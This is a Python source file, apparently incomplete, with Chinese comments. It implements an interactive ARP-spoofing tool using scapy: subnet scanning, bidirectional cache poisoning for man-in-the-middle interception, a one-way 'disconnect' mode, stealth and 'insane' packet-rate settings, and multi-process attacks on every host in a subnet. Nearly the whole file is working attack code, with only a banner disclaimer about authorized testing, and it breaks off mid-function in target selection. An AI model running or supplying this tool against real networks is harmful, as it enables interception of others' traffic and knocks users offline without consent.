# =============================================================================
# 【增强版 ARP 攻击/欺骗工具】
# 功能：ARP缓存毒化 | 双向欺骗 | 智能发包 | 多进程并发 | 完整日志系统
# 警告：仅用于授权安全测试和学习研究，非法攻击他人属于违法行为！
# =============================================================================

import os
import sys
import time
import socket
import struct
import threading
import multiprocessing
import logging
import logging.handlers
from datetime import datetime
from enum import Enum, auto

# 静默 scapy 的警告信息
sys.stderr = open(os.devnull, 'w')
from scapy.all import ARP, send, Ether, srp, sr1, conf
sys.stderr = sys.__stderr__

# scapy 全局配置
conf.verb = 0
conf.checkIPaddr = False


# =============================================================================
# 日志级别枚举 - 定义日志严重程度等级
# =============================================================================
class LogLevel(Enum):
    """日志级别枚举，对应标准 logging 级别"""
    DEBUG = logging.DEBUG       # 调试信息，用于开发排查
    INFO = logging.INFO         # 常规操作信息，记录关键步骤
    WARNING = logging.WARNING   # 警告信息，非致命异常
    ERROR = logging.ERROR       # 错误信息，操作失败但可恢复


# =============================================================================
# LogManager 日志管理器类
# 功能：提供统一的日志输出接口，支持控制台彩色输出和文件持久化记录
# 特性：时间戳精确到毫秒、操作类型标记、日志级别控制、文件轮转
# =============================================================================
class LogManager:
    """
    日志管理器类
    负责管理整个攻击工具的所有日志输出
    - 同时将日志输出到控制台和文件
    - 支持 DEBUG/INFO/WARNING/ERROR 四个级别
    - 文件日志自动轮转，避免单个文件过大
    """

    def __init__(self, log_dir="logs", console_level=LogLevel.INFO, file_level=LogLevel.DEBUG):
        """
        初始化日志管理器
        :param log_dir: 日志文件存储目录
        :param console_level: 控制台输出的最低日志级别
        :param file_level: 文件输出的最低日志级别
        """
        self.log_dir = log_dir
        # 确保日志目录存在
        if not os.path.exists(log_dir):
            os.makedirs(log_dir)

        # 创建根日志记录器
        self.logger = logging.getLogger("ARP_ATTACK")
        self.logger.setLevel(logging.DEBUG)
        self.logger.handlers.clear()

        # 日志格式：时间戳 | 级别 | 操作类型 | 模块 | 消息内容
        formatter = logging.Formatter(
            "%(asctime)s.%(msecs)03d | %(levelname)-7s | %(optype)-10s | %(module)s | %(message)s",
            datefmt="%Y-%m-%d %H:%M:%S"
        )

        # ===== 控制台日志处理器 =====
        console_handler = logging.StreamHandler(sys.stdout)
        console_handler.setLevel(console_level.value)
        console_handler.setFormatter(formatter)
        # 添加自定义过滤器，注入 optype 字段
        console_handler.addFilter(self._OptypeFilter())
        self.logger.addHandler(console_handler)

        # ===== 文件日志处理器（带轮转，每个文件最大 10MB，保留 5 个备份） =====
        log_filename = os.path.join(
            log_dir,
            f"arp_attack_{datetime.now().strftime('%Y%m%d_%H%M%S')}.log"
        )
        file_handler = logging.handlers.RotatingFileHandler(
            log_filename, maxBytes=10 * 1024 * 1024, backupCount=5, encoding="utf-8"
        )
        file_handler.setLevel(file_level.value)
        file_handler.setFormatter(formatter)
        file_handler.addFilter(self._OptypeFilter())
        self.logger.addHandler(file_handler)

        # 保存日志文件路径，供外部使用
        self.log_file_path = log_filename
        self._log(LogLevel.INFO, "系统", f"日志系统初始化完成，日志文件: {log_filename}")

    class _OptypeFilter(logging.Filter):
        """日志过滤器：为每条日志记录注入默认的 optype（操作类型）字段"""
        def filter(self, record):
            if not hasattr(record, "optype"):
                record.optype = "通用"
            return True

    def _log(self, level, optype, message):
        """
        底层日志记录方法
        :param level: LogLevel 枚举值，日志级别
        :param optype: 字符串，操作类型标记（如"扫描"、"欺骗"、"恢复"）
        :param message: 字符串，日志消息内容
        """
        extra = {"optype": optype}
        self.logger.log(level.value, message, extra=extra)

    def debug(self, optype, message):
        """记录 DEBUG 级别日志"""
        self._log(LogLevel.DEBUG, optype, message)

    def info(self, optype, message):
        """记录 INFO 级别日志"""
        self._log(LogLevel.INFO, optype, message)

    def warning(self, optype, message):
        """记录 WARNING 级别日志"""
        self._log(LogLevel.WARNING, optype, message)

    def error(self, optype, message):
        """记录 ERROR 级别日志"""
        self._log(LogLevel.ERROR, optype, message)


# =============================================================================
# 攻击强度枚举 - 定义发包策略等级
# =============================================================================
class AttackIntensity(Enum):
    """
    攻击强度枚举
    LOW:    低频攻击，发包间隔 0.8~1.2 秒，适合隐蔽攻击
    MEDIUM: 中频攻击，发包间隔 0.3~0.6 秒，平衡隐蔽性与效果
    HIGH:   高频攻击，发包间隔 0.1~0.2 秒，最大化攻击效果
    INSANE: 疯狂模式，发包间隔 0.02~0.08 秒，极限强度
    """
    LOW = auto()
    MEDIUM = auto()
    HIGH = auto()
    INSANE = auto()


# =============================================================================
# 攻击模式枚举 - 定义攻击行为类型
# =============================================================================
class AttackMode(Enum):
    """
    攻击模式枚举
    DISCONNECT: 断网模式 - 仅欺骗目标主机，使其无法访问网关（单向欺骗）
    MITM:       中间人模式 - 双向欺骗目标和网关，拦截流量但目标仍可上网
    """
    DISCONNECT = auto()     # 断网攻击（单向欺骗）
    MITM = auto()           # 中间人攻击（双向欺骗，不断网）


# =============================================================================
# 攻击配置类 - 集中管理所有攻击参数
# =============================================================================
class AttackConfig:
    """
    攻击配置类
    集中管理所有可调参数，方便根据不同网络环境灵活调整攻击策略
    """

    def __init__(self):
        """初始化默认攻击配置参数"""
        # 攻击强度设置
        self.intensity = AttackIntensity.MEDIUM

        # 攻击模式设置（断网模式 / 中间人模式）
        self.attack_mode = AttackMode.MITM

        # 攻击持续时间（秒），0 表示无限持续
        self.duration = 0

        # MAC 地址获取重试次数
        self.mac_retry_times = 3

        # ARP 请求超时时间（秒）
        self.arp_timeout = 1.5

        # 存活检测间隔（秒），定期检查目标是否仍然在线
        self.alive_check_interval = 30

        # 最大并发进程数（0 表示不限制）
        self.max_workers = 0

        # 智能发包：网络延迟采样窗口大小
        self.latency_window_size = 5

        # 自动恢复开关：攻击结束是否自动恢复目标网络
        self.auto_restore = True

        # 日志级别
        self.console_log_level = LogLevel.INFO
        self.file_log_level = LogLevel.DEBUG

    def get_sleep_range(self):
        """
        根据当前攻击强度返回发包间隔范围
        :return: (min_sleep, max_sleep) 元组，单位为秒
        """
        intensity_map = {
            AttackIntensity.LOW:    (0.8, 1.2),
            AttackIntensity.MEDIUM: (0.3, 0.6),
            AttackIntensity.HIGH:   (0.1, 0.2),
            AttackIntensity.INSANE: (0.02, 0.08),
        }
        return intensity_map.get(self.intensity, (0.3, 0.6))


# =============================================================================
# NetworkUtil 网络工具类
# 功能：封装底层网络操作，包括局域网扫描、MAC获取、存活检测等
# =============================================================================
class NetworkUtil:
    """
    网络工具类
    提供所有底层网络操作函数，所有方法均为静态方法或类方法，
    不依赖实例状态，确保独立可用
    """

    # 全局 MAC 地址缓存，避免重复 ARP 请求
    _mac_cache = {}

    @staticmethod
    def get_local_ip():
        """
        获取本机局域网 IP 地址
        通过创建 UDP 套接字连接到外部地址来确定本机使用的网卡 IP
        :return: 本机 IP 字符串，失败返回 None
        """
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect(("8.8.8.8", 80))
            local_ip = s.getsockname()[0]
            s.close()
            return local_ip
        except Exception:
            return None

    @staticmethod
    def get_local_subnet():
        """
        获取本机所在局域网的子网段（CIDR 格式）
        例如本机 IP 为 192.168.1.100，返回 "192.168.1.0/24"
        :return: 子网字符串，失败返回 None
        """
        local_ip = NetworkUtil.get_local_ip()
        if not local_ip:
            return None
        prefix = ".".join(local_ip.split(".")[:3])
        return f"{prefix}.0/24"

    @staticmethod
    def get_gateway_ip():
        """
        获取本机默认网关 IP 地址
        使用 scapy 的路由表查询默认路由
        :return: 网关 IP 字符串
        """
        return conf.route.route("0.0.0.0")[2]

    @staticmethod
    def get_default_iface():
        """
        获取本机默认网络接口名称
        :return: 网卡接口名字符串
        """
        return conf.route.route("0.0.0.0")[0]

    @classmethod
    def get_mac(cls, ip, log, retry_times=3):
        """
        通过 ARP 请求获取目标 IP 对应的 MAC 地址（带缓存和重试机制）
        工作原理：向目标 IP 发送 ARP 广播请求，目标设备回复自己的 MAC 地址
        :param ip: 目标 IP 地址字符串
        :param log: LogManager 实例，用于日志记录
        :param retry_times: 最大重试次数
        :return: MAC 地址字符串（格式 "xx:xx:xx:xx:xx:xx"），失败返回 None
        """
        # 优先从缓存中获取
        if ip in cls._mac_cache:
            log.debug("MAC获取", f"{ip} 的 MAC 地址从缓存命中: {cls._mac_cache[ip]}")
            return cls._mac_cache[ip]

        for attempt in range(1, retry_times + 1):
            try:
                log.debug("MAC获取", f"第 {attempt}/{retry_times} 次尝试获取 {ip} 的 MAC 地址")
                # 构造并发送 ARP 请求（以太网广播 + ARP 请求）
                ans, _ = srp(
                    Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip),
                    timeout=1.5,
                    verbose=0
                )
                for sent, received in ans:
                    mac = received.hwsrc
                    cls._mac_cache[ip] = mac
                    log.debug("MAC获取", f"成功获取 {ip} -> {mac}")
                    return mac
            except Exception as e:
                log.debug("MAC获取", f"第 {attempt} 次尝试异常: {e}")
            if attempt < retry_times:
                time.sleep(0.3)
        log.warning("MAC获取", f"无法获取 {ip} 的 MAC 地址（已重试 {retry_times} 次）")
        return None

    @classmethod
    def scan_online_devices(cls, log, subnet=None):
        """
        扫描指定子网内所有在线设备的 IP 地址
        通过发送 ARP 广播扫描整个子网，收集所有响应的设备
        :param log: LogManager 实例
        :param subnet: 子网字符串（如 "192.168.1.0/24"），为 None 时自动检测
        :return: 在线设备 IP 地址列表
        """
        if subnet is None:
            subnet = cls.get_local_subnet()
        if not subnet:
            log.error("扫描", "无法获取本地子网，扫描失败")
            return []

        log.info("扫描", f"开始扫描子网 {subnet} 的在线设备...")
        try:
            arp_req = ARP(pdst=subnet)
            eth_broadcast = Ether(dst="ff:ff:ff:ff:ff:ff")
            packet = eth_broadcast / arp_req
            result = srp(packet, timeout=3, verbose=0)[0]

            online_ips = []
            for sent, received in result:
                ip = received.psrc
                mac = received.hwsrc
                online_ips.append(ip)
                cls._mac_cache[ip] = mac
                log.info("扫描", f"发现在线设备: IP={ip}, MAC={mac}")

            log.info("扫描", f"扫描完成，共发现 {len(online_ips)} 台在线设备")
            return online_ips
        except Exception as e:
            log.error("扫描", f"扫描子网时发生异常: {e}")
            return []

    @classmethod
    def is_host_alive(cls, ip, log, timeout=2.0):
        """
        检测目标主机是否在线（ARP Ping 方式）
        向目标发送 ARP 请求，如果在超时时间内收到响应则认为在线
        :param ip: 目标 IP 地址
        :param log: LogManager 实例
        :param timeout: 响应超时时间（秒）
        :return: True 表示在线，False 表示离线
        """
        try:
            response = sr1(
                ARP(pdst=ip),
                timeout=timeout,
                verbose=0
            )
            is_alive = response is not None
            if is_alive:
                cls._mac_cache[ip] = response.hwsrc
            return is_alive
        except Exception:
            return False

    @classmethod
    def measure_latency(cls, ip, log):
        """
        测量到目标 IP 的网络延迟（通过 ARP 往返时间）
        用于智能发包算法，根据延迟动态调整发包频率
        :param ip: 目标 IP 地址
        :param log: LogManager 实例
        :return: 延迟时间（秒），测量失败返回 None
        """
        try:
            start_time = time.time()
            response = sr1(ARP(pdst=ip), timeout=1.0, verbose=0)
            if response:
                latency = time.time() - start_time
                return latency
            return None
        except Exception:
            return None

    @classmethod
    def clear_mac_cache(cls):
        """清空 MAC 地址缓存"""
        cls._mac_cache.clear()

    @classmethod
    def get_cache_size(cls):
        """
        获取当前缓存的 MAC 地址数量
        :return: 缓存条数
        """
        return len(cls._mac_cache)


# =============================================================================
# SmartPacketSender 智能发包器类
# 功能：根据网络延迟和攻击强度，动态调整发包频率，实现智能化攻击
# =============================================================================
class SmartPacketSender:
    """
    智能发包器类
    维护一个网络延迟采样窗口，根据实时延迟数据动态计算最优发包间隔
    核心算法：在攻击强度设定的基础间隔上，根据网络状况微调
    - 延迟低 → 适当提高发包频率（但不超过强度上限）
    - 延迟高 → 适当降低发包频率（避免拥塞丢包）
    """

    def __init__(self, config, log):
        """
        初始化智能发包器
        :param config: AttackConfig 实例
        :param log: LogManager 实例
        """
        self.config = config
        self.log = log
        self._latency_samples = []
        self._window_size = config.latency_window_size
        self._min_sleep, self._max_sleep = config.get_sleep_range()

    def feed_latency(self, latency):
        """
        向采样窗口添加一个延迟数据点
        :param latency: 延迟时间（秒），None 表示测量失败
        """
        if latency is not None:
            self._latency_samples.append(latency)
            if len(self._latency_samples) > self._window_size:
                self._latency_samples.pop(0)

    def get_sleep_interval(self):
        """
        计算当前应使用的发包间隔
        算法说明：
        1. 取基础间隔范围（由攻击强度决定）
        2. 如果延迟采样窗口足够，取平均延迟
        3. 延迟较低时，趋向使用较短间隔；延迟较高时，趋向使用较长间隔
        :return: 发包间隔（秒）
        """
        import random

        if len(self._latency_samples) >= 2:
            avg_latency = sum(self._latency_samples) / len(self._latency_samples)
            # 延迟调整因子：延迟越低，因子越小，发包越快
            # 延迟超过 100ms 时开始减缓，低于 10ms 时加速
            latency_factor = min(max(avg_latency / 0.05, 0.5), 1.5)
            adjusted_min = self._min_sleep * latency_factor
            adjusted_max = self._max_sleep * latency_factor
            sleep_time = random.uniform(adjusted_min, adjusted_max)
            self.log.debug("智能发包", f"平均延迟={avg_latency*1000:.1f}ms, 因子={latency_factor:.2f}, 间隔={sleep_time*1000:.0f}ms")
        else:
            sleep_time = random.uniform(self._min_sleep, self._max_sleep)

        return sleep_time

    def update_intensity(self):
        """当攻击强度改变时，更新基础间隔范围"""
        self._min_sleep, self._max_sleep = self.config.get_sleep_range()

    def reset_samples(self):
        """重置延迟采样窗口"""
        self._latency_samples.clear()


# =============================================================================
# ARPSpoofer ARP欺骗核心引擎类
# 功能：实现ARP缓存毒化的核心逻辑，支持双向欺骗模式
# 原理：
#   1. 向目标主机发送伪造的ARP响应，宣称"我是网关"
#   2. 向网关发送伪造的ARP响应，宣称"我是目标主机"
#   3. 持续高速发包，覆盖目标设备的ARP缓存表
# =============================================================================
class ARPSpoofer:
    """
    ARP欺骗核心引擎
    负责构造并发送伪造的 ARP 响应包，实现中间人攻击或断网攻击
    支持两种工作模式：
    - 双向欺骗：同时欺骗目标和网关，实现流量拦截（中间人攻击）
    - 单向欺骗：仅欺骗目标主机，使其无法访问网关（断网攻击）
    """

    def __init__(self, target_ip, gateway_ip, attacker_mac, iface, config, log):
        """
        初始化 ARP 欺骗器
        :param target_ip: 目标主机 IP
        :param gateway_ip: 网关 IP
        :param attacker_mac: 攻击者本机 MAC 地址（伪造包的源 MAC）
        :param iface: 使用的网络接口名称
        :param config: AttackConfig 实例
        :param log: LogManager 实例
        """
        self.target_ip = target_ip
        self.gateway_ip = gateway_ip
        self.attacker_mac = attacker_mac
        self.iface = iface
        self.config = config
        self.log = log

        # 获取目标的真实 MAC 和网关的真实 MAC（用于网络恢复）
        self.target_mac = None
        self.gateway_mac = None

        # 统计信息
        self.packets_sent = 0
        self.errors_count = 0
        self.start_time = None
        self._running = False

    def initialize(self):
        """
        预初始化：获取目标和网关的真实 MAC 地址
        在攻击开始前调用，确保所有必要信息可用
        :return: True 表示初始化成功，False 表示失败
        """
        self.log.info("欺骗", f"正在获取 {self.target_ip} 的 MAC 地址...")
        self.target_mac = NetworkUtil.get_mac(
            self.target_ip, self.log, retry_times=self.config.mac_retry_times
        )
        if not self.target_mac:
            self.log.error("欺骗", f"无法获取目标 {self.target_ip} 的 MAC 地址，该设备可能离线")
            return False

        self.log.info("欺骗", f"正在获取网关 {self.gateway_ip} 的 MAC 地址...")
        self.gateway_mac = NetworkUtil.get_mac(
            self.gateway_ip, self.log, retry_times=self.config.mac_retry_times
        )
        if not self.gateway_mac:
            self.log.error("欺骗", f"无法获取网关 {self.gateway_ip} 的 MAC 地址")
            return False

        self.log.info("欺骗", f"目标 {self.target_ip} -> MAC: {self.target_mac}")
        self.log.info("欺骗", f"网关 {self.gateway_ip} -> MAC: {self.gateway_mac}")
        return True

    def send_poison_packets(self):
        """
        发送一次 ARP 毒化数据包（双向欺骗）
        包1：向目标发送 "网关注册在我的MAC上"
        包2：向网关发送 "目标注册在我的MAC上"
        """
        try:
            # 包1：欺骗目标主机，告诉它 "网关 IP 对应我的 MAC 地址"
            packet_to_target = (
                Ether(dst=self.target_mac) /
                ARP(
                    op=2,                          # op=2 表示 ARP 响应
                    psrc=self.gateway_ip,          # 声称的源 IP（网关 IP）
                    pdst=self.target_ip,           # 目标 IP
                    hwsrc=self.attacker_mac,       # 声称的源 MAC（攻击者 MAC）
                    hwdst=self.target_mac          # 目标的 MAC
                )
            )
            send(packet_to_target, verbose=0)

            # 包2：欺骗网关，告诉它 "目标 IP 对应我的 MAC 地址"
            packet_to_gateway = (
                Ether(dst=self.gateway_mac) /
                ARP(
                    op=2,
                    psrc=self.target_ip,           # 声称的源 IP（目标 IP）
                    pdst=self.gateway_ip,          # 网关 IP
                    hwsrc=self.attacker_mac,       # 声称的源 MAC（攻击者 MAC）
                    hwdst=self.gateway_mac         # 网关的 MAC
                )
            )
            send(packet_to_gateway, verbose=0)

            self.packets_sent += 2
        except Exception as e:
            self.errors_count += 1
            self.log.error("欺骗", f"发包异常: {e}")

    def send_unidirectional_packets(self):
        """
        发送单向 ARP 毒化包（仅欺骗目标主机，实现断网效果）
        只向目标发送伪造的网关 ARP 响应，不欺骗网关
        """
        try:
            packet_to_target = (
                Ether(dst=self.target_mac) /
                ARP(
                    op=2,
                    psrc=self.gateway_ip,
                    pdst=self.target_ip,
                    hwsrc=self.attacker_mac,
                    hwdst=self.target_mac
                )
            )
            send(packet_to_target, verbose=0)
            self.packets_sent += 1
        except Exception as e:
            self.errors_count += 1
            self.log.error("欺骗", f"发包异常: {e}")

    def run_attack_loop(self, stop_event, smart_sender, bidirectional=True):
        """
        运行 ARP 欺骗攻击主循环
        持续发送伪造的 ARP 响应包，直到收到停止信号
        :param stop_event: multiprocessing.Event，用于跨进程通知停止
        :param smart_sender: SmartPacketSender 实例，用于智能发包
        :param bidirectional: 是否启用双向欺骗模式
        """
        self._running = True
        self.start_time = time.time()
        self.log.info("欺骗", f"对 {self.target_ip} 启动 ARP 欺骗攻击（{'双向' if bidirectional else '单向'}模式）")

        check_counter = 0

        while not stop_event.is_set():
            # 检查攻击持续时间是否已到
            if self.config.duration > 0:
                elapsed = time.time() - self.start_time
                if elapsed >= self.config.duration:
                    self.log.info("欺骗", f"对 {self.target_ip} 的攻击持续时间已到")
                    break

            # 发送毒化包
            if bidirectional:
                self.send_poison_packets()
            else:
                self.send_unidirectional_packets()

            # 定期检查目标存活状态
            check_counter += 1
            if check_counter >= 50:  # 每约 50 次发包检查一次（约每10-15秒）
                check_counter = 0
                if not NetworkUtil.is_host_alive(self.target_ip, self.log):
                    self.log.warning("欺骗", f"目标 {self.target_ip} 可能已离线，尝试重新获取 MAC...")
                    new_mac = NetworkUtil.get_mac(self.target_ip, self.log)
                    if new_mac:
                        self.target_mac = new_mac
                        self.log.info("欺骗", f"目标 {self.target_ip} 重新上线，MAC: {new_mac}")
                    else:
                        self.log.warning("欺骗", f"目标 {self.target_ip} 仍然离线，继续尝试")

                # 测量延迟用于智能发包
                latency = NetworkUtil.measure_latency(self.target_ip, self.log)
                if latency is not None:
                    smart_sender.feed_latency(latency)

            # 等待间隔（智能调整）
            sleep_interval = smart_sender.get_sleep_interval()
            if stop_event.wait(sleep_interval):
                break

        self._running = False
        elapsed = time.time() - self.start_time if self.start_time else 0
        self.log.info("欺骗", (
            f"攻击结束 | 目标={self.target_ip} | "
            f"发送包数={self.packets_sent} | "
            f"错误数={self.errors_count} | "
            f"持续时间={elapsed:.1f}秒"
        ))

    def restore_target(self):
        """
        恢复目标主机的 ARP 缓存表
        发送正确的 ARP 响应包，将网关的真实 MAC 告知目标，
        同时将目标的真实 MAC 告知网关
        """
        if not self.target_mac or not self.gateway_mac:
            self.log.warning("恢复", f"无法恢复 {self.target_ip}，缺少 MAC 信息")
            return

        self.log.info("恢复", f"正在恢复 {self.target_ip} 的 ARP 缓存...")
        try:
            # 向目标发送正确的网关 MAC
            send(
                Ether(dst=self.target_mac) /
                ARP(
                    op=2,
                    psrc=self.gateway_ip,
                    pdst=self.target_ip,
                    hwsrc=self.gateway_mac,        # 使用真实的网关 MAC
                    hwdst=self.target_mac
                ),
                count=5,
                verbose=0
            )
            # 向网关发送正确的目标 MAC
            send(
                Ether(dst=self.gateway_mac) /
                ARP(
                    op=2,
                    psrc=self.target_ip,
                    pdst=self.gateway_ip,
                    hwsrc=self.target_mac,         # 使用真实的目标 MAC
                    hwdst=self.gateway_mac
                ),
                count=5,
                verbose=0
            )
            self.log.info("恢复", f"✅ {self.target_ip} 的 ARP 缓存已恢复")
        except Exception as e:
            self.log.error("恢复", f"恢复 {self.target_ip} 时发生异常: {e}")


# =============================================================================
# AttackCoordinator 攻击协调器类
# 功能：使用多进程技术管理多个 ARP 欺骗攻击任务，协调并发攻击
# =============================================================================
class AttackCoordinator:
    """
    攻击协调器
    使用 multiprocessing 模块创建多个工作进程，
    每个进程负责对一个目标发起 ARP 欺骗攻击
    功能包括：
    - 启动/停止所有攻击进程
    - 监控攻击状态
    - 资源占用控制
    - 自动恢复所有目标网络
    """

    def __init__(self, config, log):
        """
        初始化攻击协调器
        :param config: AttackConfig 实例
        :param log: LogManager 实例
        """
        self.config = config
        self.log = log
        self.processes = []
        self.stop_event = multiprocessing.Event()
        self.start_time = None

    @staticmethod
    def _worker_process(target_ip, gateway_ip, attacker_mac, iface,
                        config, stop_event, log_dir):
        """
        攻击工作进程的入口函数（静态方法，由 multiprocessing 调用）
        每个目标对应一个独立进程，拥有自己的 Spoofer 和 SmartSender
        :param target_ip: 目标 IP
        :param gateway_ip: 网关 IP
        :param attacker_mac: 攻击者 MAC
        :param iface: 网络接口
        :param config: AttackConfig 实例
        :param stop_event: 跨进程停止事件
        :param log_dir: 日志目录路径
        """
        try:
            # 每个子进程创建独立的日志管理器
            proc_log = LogManager(
                log_dir=log_dir,
                console_level=config.console_log_level,
                file_level=config.file_log_level
            )
            proc_log.info("进程", f"工作进程启动，目标={target_ip}")

            # 设置 scapy 接口
            conf.iface = iface

            # 创建智能发包器
            smart_sender = SmartPacketSender(config, proc_log)

            # 创建 ARP 欺骗器
            spoofer = ARPSpoofer(target_ip, gateway_ip, attacker_mac, iface, config, proc_log)

            # 初始化欺骗器
            if not spoofer.initialize():
                proc_log.error("进程", f"无法初始化对 {target_ip} 的攻击")
                return

            # 根据攻击模式决定欺骗方向
            # MITM模式：双向欺骗（目标和网关都欺骗），目标仍可上网
            # DISCONNECT模式：单向欺骗（仅欺骗目标），目标断网
            bidirectional = (config.attack_mode == AttackMode.MITM)
            mode_name = "中间人(双向)" if bidirectional else "断网(单向)"
            proc_log.info("进程", f"攻击模式: {mode_name}")

            # 启动攻击循环
            spoofer.run_attack_loop(stop_event, smart_sender, bidirectional=bidirectional)

            # 攻击结束后恢复目标
            if config.auto_restore:
                spoofer.restore_target()

            proc_log.info("进程", f"工作进程结束，目标={target_ip}")
        except Exception as e:
            # 子进程中的异常捕获
            import traceback
            traceback.print_exc()

    def add_target(self, target_ip, gateway_ip, attacker_mac, iface):
        """
        添加一个攻击目标，创建对应的工作进程
        :param target_ip: 目标 IP
        :param gateway_ip: 网关 IP
        :param attacker_mac: 攻击者 MAC
        :param iface: 网络接口
        """
        proc = multiprocessing.Process(
            target=self._worker_process,
            args=(
                target_ip, gateway_ip, attacker_mac, iface,
                self.config, self.stop_event, self.log.log_dir
            ),
            daemon=True,
            name=f"ARP-Worker-{target_ip}"
        )
        self.processes.append((target_ip, proc))
        self.log.info("协调", f"已注册攻击目标: {target_ip}")

    def start_all(self):
        """
        启动所有攻击工作进程
        限制同时运行的进程数，避免系统资源耗尽
        """
        if not self.processes:
            self.log.warning("协调", "没有注册任何攻击目标")
            return

        self.log.info("协调", f"正在启动 {len(self.processes)} 个攻击进程...")
        self.start_time = time.time()

        # 确定最大并发进程数
        max_workers = self.config.max_workers
        if max_workers <= 0:
            max_workers = min(len(self.processes), multiprocessing.cpu_count() * 2)

        # 分批启动进程，控制并发数
        for i, (target_ip, proc) in enumerate(self.processes):
            if self.stop_event.is_set():
                break
            proc.start()
            self.log.info("协调", f"已启动攻击进程 [{i+1}/{len(self.processes)}]: {target_ip}")
            # 错开启动时间，避免瞬间爆发
            time.sleep(0.1)

    def stop_all(self):
        """停止所有攻击进程"""
        self.log.info("协调", "正在停止所有攻击进程...")
        self.stop_event.set()
        time.sleep(0.5)

        for target_ip, proc in self.processes:
            if proc.is_alive():
                proc.join(timeout=5)
                if proc.is_alive():
                    self.log.warning("协调", f"强制终止进程: {target_ip}")
                    proc.terminate()
                    proc.join(timeout=3)

        self.log.info("协调", "所有攻击进程已停止")

    def get_stats(self):
        """
        获取攻击统计信息
        :return: 统计字典
        """
        elapsed = time.time() - self.start_time if self.start_time else 0
        active = sum(1 for _, p in self.processes if p.is_alive())
        return {
            "total_targets": len(self.processes),
            "active_processes": active,
            "elapsed_seconds": elapsed,
        }

    def restore_all(self, gateway_ip, attacker_mac, iface):
        """
        恢复所有目标的 ARP 缓存表
        在攻击进程已经停止后，手动恢复网络
        :param gateway_ip: 网关 IP
        :param attacker_mac: 攻击者 MAC
        :param iface: 网络接口
        """
        self.log.info("恢复", f"正在恢复所有 {len(self.processes)} 个目标的网络...")
        for target_ip, _ in self.processes:
            spoofer = ARPSpoofer(target_ip, gateway_ip, attacker_mac, iface, self.config, self.log)
            if spoofer.initialize():
                spoofer.restore_target()
            time.sleep(0.05)
        self.log.info("恢复", "✅ 所有目标网络已恢复")


# =============================================================================
# 交互式菜单函数
# =============================================================================
def show_banner():
    """显示攻击工具横幅"""
    banner = r"""
    ╔════════════════════════════════════════════════════════════╗
    ║         🔥 增强版 ARP 欺骗/攻击工具 v2.0 🔥                ║
    ║     功能：双向欺骗 | 缓存毒化 | 智能发包 | 多进程并发        ║
    ║     ⚠️  仅用于授权安全测试和学习研究，非法使用违法！ ⚠️      ║
    ╚════════════════════════════════════════════════════════════╝
    """
    print(banner)


def select_intensity(log):
    """
    交互式选择攻击强度
    :param log: LogManager 实例
    :return: AttackIntensity 枚举值
    """
    print("\n" + "=" * 55)
    print("【攻击强度选择】")
    print("  [1] 低频 (LOW)     - 发包间隔 0.8~1.2s  | 隐蔽模式")
    print("  [2] 中频 (MEDIUM)  - 发包间隔 0.3~0.6s  | 推荐 ★")
    print("  [3] 高频 (HIGH)    - 发包间隔 0.1~0.2s  | 强力模式")
    print("  [4] 疯狂 (INSANE)  - 发包间隔 0.02~0.08s | 极限模式")
    print("=" * 55)

    while True:
        choice = input("请选择攻击强度 [2]: ").strip()
        if choice == "":
            return AttackIntensity.MEDIUM
        if choice == "1":
            return AttackIntensity.LOW
        elif choice == "2":
            return AttackIntensity.MEDIUM
        elif choice == "3":
            return AttackIntensity.HIGH
        elif choice == "4":
            return AttackIntensity.INSANE
        else:
            print("输入无效，请输入 1-4")


def select_duration(log):
    """
    交互式选择攻击持续时间
    :param log: LogManager 实例
    :return: 持续时间（秒），0 表示无限
    """
    print("\n" + "=" * 55)
    print("【攻击持续时间】")
    print("  [0] 无限持续（直到手动停止 Ctrl+C）")
    print("  [自定义] 输入秒数，例如 60 表示攻击 60 秒后自动停止")
    print("=" * 55)

    while True:
        choice = input("请选择持续时间(秒) [0]: ").strip()
        if choice == "" or choice == "0":
            return 0
        try:
            duration = float(choice)
            if duration > 0:
                return duration
            else:
                print("请输入正数")
        except ValueError:
            print("输入无效，请输入数字")


def select_attack_mode(log):
    """
    交互式选择攻击模式
    :param log: LogManager 实例
    :return: AttackMode 枚举值
    """
    print("\n" + "=" * 55)
    print("【攻击效果选择】")
    print("  [1] 断网模式   - 目标无法上网，完全断网")
    print("  [2] 中间人模式 - 目标仍可上网，流量经过本机 ★")
    print("=" * 55)
    print("  说明：")
    print("    · 断网模式：仅欺骗目标主机，使其ARP表中网关MAC错误")
    print("    · 中间人模式：双向欺骗，目标流量经过本机转发")

    while True:
        choice = input("请选择攻击效果 [2]: ").strip()
        if choice == "" or choice == "2":
            log.info("配置", "攻击模式: 中间人模式(双向欺骗)")
            return AttackMode.MITM
        elif choice == "1":
            log.info("配置", "攻击模式: 断网模式(单向欺骗)")
            return AttackMode.DISCONNECT
        else:
            print("输入无效，请输入 1 或 2")


def select_auto_restore(log):
    """
    交互式选择是否自动恢复网络
    :param log: LogManager 实例
    :return: True 表示自动恢复，False 表示不恢复
    """
    print("\n" + "=" * 55)
    print("【网络恢复设置】")
    print("  [1] 自动恢复 - 攻击结束后自动恢复目标网络 ★")
    print("  [2] 手动恢复 - 攻击结束后不恢复，目标保持断网/被劫持状态")
    print("=" * 55)
    print("  说明：")
    print("    · 自动恢复：攻击停止后发送正确ARP包，目标网络恢复正常")
    print("    · 手动恢复：目标ARP表保持被毒化状态，需手动恢复或等待ARP缓存过期")

    while True:
        choice = input("请选择恢复方式 [1]: ").strip()
        if choice == "" or choice == "1":
            log.info("配置", "网络恢复: 自动恢复")
            return True
        elif choice == "2":
            log.info("配置", "网络恢复: 手动恢复(不自动恢复)")
            return False
        else:
            print("输入无效，请输入 1 或 2")


def select_targets(log, local_ip, gateway):
    """
    交互式选择攻击目标
    :param log: LogManager 实例
    :param local_ip: 本机 IP
    :param gateway: 网关 IP
    :return: 目标 IP 列表
    """
    print("\n" + "=" * 55)
    print("【目标选择】")
    print("  [1] 单目标攻击 - 选择一个设备进行ARP欺骗")
    print("  [2] 全网段攻击 - 攻击局域网内所有在线设备")
    print("=" * 55)

    while True:
        mode = input("请选择攻击模式 [1]: ").strip()
        if mode == "":
            mode = "1"
        if mode == "1":
            # 单目标模式
            all_ips = NetworkUtil.scan_online_devices(log)
            if not all_ips:
                print("\n[错误] 未发现在线设备！")
                return []

            # 过滤掉本机和网关
            valid_targets = [ip for ip in all_ips if ip != local_ip and ip != gateway]
            if not valid_targets:
                print("\n[提示] 未发现可攻击的目标设备")
                return []

